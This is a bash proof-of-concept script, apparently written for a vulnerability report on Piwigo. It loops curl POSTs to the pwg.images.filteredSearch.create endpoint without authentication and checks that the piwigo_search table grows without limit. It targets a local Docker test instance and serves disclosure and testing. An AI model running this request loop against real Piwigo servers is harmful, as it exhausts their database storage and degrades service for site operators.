#!/usr/bin/env bash
# nv4-filtered-search-unbounded.sh — PoC for
# `unauth.pwg.images.filteredSearch.create.unbounded-search-rows`.
#
# Regular-user perspective: anonymous / guest user can spam
# pwg.images.filteredSearch.create without authentication, rate-limiting,
# or any duplicate detection. Each call inserts a row in piwigo_search
# with a fresh search_uuid, growing the table without bound.
#
# Source: include/ws_functions/pwg.images.php:753-1089 (ws_images_filteredSearch_create)
#         include/functions_search.inc.php:2106 (save_search — unconditional INSERT)

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$HERE/evidence/nv4-filtered-search-unbounded"
mkdir -p "$OUT"

WEB="${WEB:-http://localhost:8089}"
DB_USER="piwigo"
DB_PASS="pocpass"
DB_SERVICE="piwigo-poc-db"
PREFIX="piwigo_"
N="${N:-20}"   # number of anonymous inserts to demonstrate unbounded growth

DB="docker exec $DB_SERVICE mysql --user=$DB_USER --password=$DB_PASS piwigo"

echo "[nv4] === BEFORE STATE ==="
$DB -e "SELECT COUNT(*) AS search_rows FROM ${PREFIX}search;" \
  > "$OUT/db-before-count.txt"
BEFORE=$(awk 'NR==2 {print $1}' "$OUT/db-before-count.txt")
echo "  piwigo_search row count BEFORE: $BEFORE"
echo

echo "[nv4] === STEP: $N anonymous POST to pwg.images.filteredSearch.create ==="
LOG="$OUT/request-log.txt"
: > "$LOG"
for i in $(seq 1 "$N"); do
  WORD="anon_poc_${i}_$(date +%s%N)"
  RESP="$OUT/resp-$i-$N.xml"
  HTTP=$(curl -sS -X POST "$WEB/ws.php?method=pwg.images.filteredSearch.create" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "allwords=${WORD}&allwords_mode=AND" \
    -o "$RESP" -w '%{http_code}')
  SEARCH_ID=$(grep -oE '<search_id>[^<]+</search_id>' "$RESP" | head -1)
  printf '  req %2d  HTTP=%s  %s\n' "$i" "$HTTP" "$SEARCH_ID" | tee -a "$LOG"
done
echo

echo "[nv4] === AFTER STATE ==="
$DB -e "SELECT COUNT(*) AS search_rows FROM ${PREFIX}search;" \
  > "$OUT/db-after-count.txt"
AFTER=$(awk 'NR==2 {print $1}' "$OUT/db-after-count.txt")
DELTA=$(( AFTER - BEFORE ))
echo "  piwigo_search row count AFTER:  $AFTER"
echo "  delta:                          $DELTA"
echo

# Sample 5 newest rows to show the inserts are real
$DB -e "SELECT id, search_uuid, created_by, created_on FROM ${PREFIX}search ORDER BY id DESC LIMIT 5;" \
  > "$OUT/db-after-sample.txt"
echo "  newest 5 rows:"
sed 's/^/    /' "$OUT/db-after-sample.txt"
echo

echo "[nv4] === ASSERTIONS ==="
PASS=true

# (1) All N requests returned HTTP 200
#     Use grep ... || true so pipefail does not trip on empty matches.
BAD=$( (grep -v 'HTTP=200' "$LOG" || true) | wc -l | tr -d ' ')
if [[ "$BAD" == "0" ]]; then
  echo "  [PASS] all $N anonymous requests returned HTTP 200"
else
  echo "  [FAIL] $BAD of $N requests did not return 200"
  PASS=false
fi

# (2) All N responses have a non-empty <search_id>
UNIQUE_SIDS=$(grep -oE '<search_id>[^<]+</search_id>' "$OUT"/resp-*.xml | sort -u | wc -l | tr -d ' ')
if [[ "$UNIQUE_SIDS" -ge "$N" ]]; then
  echo "  [PASS] $UNIQUE_SIDS unique search_ids returned (≥ N=$N)"
else
  echo "  [FAIL] only $UNIQUE_SIDS unique search_ids (< N=$N)"
  PASS=false
fi

# (3) piwigo_search row count grew by exactly N (no rate cap, no dedup)
if [[ "$DELTA" -ge "$N" ]]; then
  echo "  [PASS] piwigo_search grew by $DELTA rows (≥ N=$N) — unbounded"
else
  echo "  [FAIL] piwigo_search grew by only $DELTA rows (< N=$N)"
  PASS=false
fi

# (4) Confirm the requests were sent without any cookie
echo "  -- verify one request's curl trace carried no cookies --"
TRACE="$OUT/anonymous-trace.txt"
curl -sS -v -X POST "$WEB/ws.php?method=pwg.images.filteredSearch.create" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "allwords=trace_check&allwords_mode=AND" \
  -o /dev/null 2> "$TRACE"
if grep -q '^> Cookie:' "$TRACE"; then
  echo "  [FAIL] curl request sent a Cookie header (not anon)"
  PASS=false
else
  echo "  [PASS] curl request sent NO Cookie header (truly anonymous)"
fi

# (5) No CSRF token, no pwg_token header
if grep -qE 'pwg_token|X-CSRF' "$TRACE"; then
  echo "  [FAIL] request included a token header (endpoint is not token-gated)"
  PASS=false
else
  echo "  [PASS] request included no token header (endpoint accepts anon with no token)"
fi

echo
if $PASS; then
  echo "[nv4] === RESULT: PASS — anonymous unbounded insert confirmed ==="
  exit 0
else
  echo "[nv4] === RESULT: FAIL — see assertions above ==="
  exit 1
fi